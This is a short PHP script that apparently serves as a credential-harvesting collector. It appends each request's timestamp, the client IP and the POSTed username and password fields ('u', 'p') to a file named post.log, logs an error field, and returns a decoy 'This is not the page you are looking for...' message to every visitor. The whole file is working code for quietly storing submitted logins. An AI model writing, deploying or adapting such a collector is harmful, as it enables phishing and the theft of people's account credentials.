<?php

//echo "Hello World! ";
//echo "Hello " . htmlspecialchars($_GET["name"]) . '!' ;
//if (!is_null($_POST["key1"]))

$ip = $_SERVER['REMOTE_ADDR'];
$log = date('Y-m-d_H:i:s') . "\t\t" . $ip . "\t\t";

if ( array_key_exists("u", $_POST) )
{
	$log = $log . htmlspecialchars($_POST["u"]) . ":";
	
	if ( array_key_exists("p", $_POST) )
	{
		$log = $log . htmlspecialchars($_POST["p"]);
	}
	
	//echo $log;
	$myFile = "post.log";
	$fh = fopen($myFile, 'a') or die("\nError");
	$stringData = "$log\n";
	fwrite($fh, $stringData);
	fclose($fh);
}
elseif ( array_key_exists("e", $_POST) )
{
	$log = $log . "Error: " . htmlspecialchars($_POST["e"]);
	
	//echo $log;
	$myFile = "post.log";
	$fh = fopen($myFile, 'a') or die("");
	$stringData = "$log\n";
	fwrite($fh, $stringData);
	fclose($fh);
}
else
{
	//echo "This is not the page you are looking for...";
}

echo "This is not the page you are looking for...";

?>
